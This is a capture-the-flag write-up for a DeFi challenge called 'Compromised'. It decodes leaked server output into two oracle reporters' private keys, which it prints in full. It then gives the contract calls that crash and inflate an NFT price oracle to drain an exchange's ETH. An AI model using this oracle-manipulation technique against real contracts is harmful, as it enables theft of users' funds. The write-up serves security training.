## Compromised

### Challenge description

> While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:

```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 
30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 
55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 
47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 
4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 
68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 
68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 
55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 
32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 
4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 
33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

> A related on-chain exchange is selling (absurdly overpriced) collectibles called "DVNFT", now at 999 ETH each
>
> This price is fetched from an on-chain oracle, and is based on three trusted reporters:
> `0xA73209FB1a42495120166736362A1DfA9F95A105`
> `0xe92401A4d3af5E446d93D11EEc806b1462b39D15`
> `0x81A5D6E50C214044bE44cA0CB057fe119097850c`
>
> Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.

### Solution

The server response has 2 long strings which when decoded as a string as suggested by the headers, they return the following:

```
MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
```

```
MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
```

These look like base64 strings, which we can further decode into:

```
0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
```

```
0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
```

When trying these out as private keys, we obtain the private keys for the last two addresses in the `sources` list, which are the EOAs allowed to post prices to the oracle.

Now that we can use these addresses, we can call `postPrice()` for the "DVNFT" NFTs:

```python
oracle.postPrice("DVNFT",0, _fromLeakedAcc[0])
oracle.postPrice("DVNFT",0, _fromLeakedAcc[1])
```

After posting 0 for each of them, the median price returned by `getMedianPrice()` will return 0, as the median of $\{990, 0, 0\}$ is $0$.

We can then use the attacker account to buy one of these NFTs for 1 wei. We need to send at least 1 wei when buying, as requested by the `buyOne()` function:

```solidity
uint256 amountPaidInWei = msg.value;
require(amountPaidInWei > 0, "Amount paid must be greater than zero");
```

After obtaining the NFT, we can post a new price corresponding to the entire balance of the NFT exchange:

```python
oracle.postPrice("DVNFT", exchange.balance(), _fromLeakedAcc[0])
oracle.postPrice("DVNFT", exchange.balance(), _fromLeakedAcc[1])
```

Then we must approve the token to be taken from the attacker wallet by the exchange calling `approve()` with the ID of our NFT (`0`):

```py
nft_token.approve(exchange.address, 0, _fromAttacker)
```

Then we sell the token calling `sellOne()` with the token ID:

```py
exchange.sellOne(0, _fromAttacker)
```

And then we return the price to normal, as requested by the challenge:

```py
oracle.postPrice("DVNFT",ether_to_wei(999), _fromLeakedAcc[0])
oracle.postPrice("DVNFT",ether_to_wei(999), _fromLeakedAcc[1])
```


